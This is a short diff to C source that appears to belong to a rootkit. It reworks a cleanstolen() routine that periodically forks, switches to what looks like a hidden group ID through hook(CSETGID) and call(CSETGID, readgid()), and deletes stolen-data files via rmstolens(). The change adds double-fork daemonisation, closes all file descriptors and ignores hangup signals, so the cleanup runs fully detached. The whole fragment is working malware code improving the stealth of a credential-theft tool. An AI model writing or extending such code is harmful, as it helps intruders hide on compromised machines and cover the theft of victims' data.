@@ -25,14 +25,28 @@ void cleanstolen(void){
     
     if(itistime(CLEANEDTIME_PATH, curtime, FILE_CLEANSE_TIMER)){
         pid_t pid = fork();
-        if(pid == 0){
-            setsid();
-            hook(CSETGID);
-            call(CSETGID, readgid());
-            rmstolens();
-            exit(0);
-        }else if(pid < 0) return;
+        if(pid < 0) return;
+        if(pid > 0){
+            writenewtime(CLEANEDTIME_PATH, curtime);
+            return;
+        }
+
         signal(SIGCHLD, SIG_IGN);
-        writenewtime(CLEANEDTIME_PATH, curtime);
+        signal(SIGHUP, SIG_IGN);
+
+        /* close all open fds */
+        for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
+            close(i);
+
+        if(setsid() < 0)
+            exit(0);
+
+        pid = fork();
+        if(pid != 0) exit(0);
+
+        hook(CSETGID);
+        call(CSETGID, readgid());
+        rmstolens();
+        exit(0);
     }
 }
